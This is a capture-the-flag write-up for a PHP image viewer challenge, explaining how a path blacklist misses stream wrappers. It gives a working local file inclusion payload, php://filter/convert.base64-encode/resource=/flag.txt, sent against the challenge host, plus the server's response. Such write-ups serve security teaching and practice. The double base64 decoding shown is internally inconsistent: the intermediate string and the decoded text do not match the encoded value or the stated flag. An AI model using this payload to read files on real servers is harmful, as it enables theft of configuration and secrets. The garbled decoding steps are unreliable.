# Alpaca Rangers — Daily Alpacahack Write-up

**Category:** Web **Difficulty:** Medium **Topic:** Local File Inclusion (LFI) 



## Description

> Hero of Justice, Alpaca Rangers!

We're given a PHP image viewer that loads files via a `?img=` GET parameter.



## Source Code Analysis


```php
$targetPath = $_GET['img'] ?? '';

if (str_starts_with($targetPath, '/') || str_starts_with($targetPath, '\\') || str_contains($targetPath, '..')) {
    $errorMessage = 'Invalid path.';
} else {
    $contents = @file_get_contents($targetPath);
    ...
    $dataUri = 'data:' . $mimeType . ';base64,' . base64_encode($contents);
}
```

The app tries to block path traversal by rejecting anything that:

-   Starts with `/` or `\`
-   Contains `..`

However, it passes the raw user input directly into `file_get_contents()` — which in PHP supports **stream wrappers** like `php://`, `file://`, `http://`, etc.


## Vulnerability

The blacklist never accounts for PHP stream wrappers. The string `php://filter/convert.base64-encode/resource=/flag.txt`:

-   Does **not** start with `/` ✓
-   Does **not** start with `\` ✓
-   Does **not** contain `..` ✓

So it passes all three checks and gets fed directly into `file_get_contents()`, which happily resolves the wrapper and reads the target file.



## Exploit

Navigate to:

```
http://34.170.146.252:51136/?img=php://filter/convert.base64-encode/resource=/flag.txt

```

The app returns the file contents embedded in an `<img>` data URI:

```html
<img src="data:text/plain;base64,UVd4d1lXTmhlMEZzY0dGallWOW5jbVV6Wmw5aGJtUmZjREZ1YTE5amIyMHhibWRmY3pCdmJuMD0=" />

```
## Decoding the Flag

The content ends up **double base64 encoded**:

1.  `php://filter` with `convert.base64-encode` base64-encodes the file contents
2.  The app then base64-encodes _that output again_ for the data URI

So we decode twice:

```
UVd4d1lXTmhlMEZzY0dGallWOW5jbVV6Wmw5aGJtUmZjREZ1YTE5amIyMHhibWRmY3pCdmJuMD0=
  ↓ base64 decode (strip data URI encoding)

QWxwYWNheUFscGFjYV9ncmUzbl9hbmRfcDFua19jb20xbmdfczBvbn0=
  ↓ base64 decode (strip php://filter encoding)

AlpacayAlpaca_gre3n_and_p1nk_com1ng_s0on}

```

**Flag:** `Alpaca{AlpacayAlpaca_gre3n_and_p1nk_com1ng_s0on}`
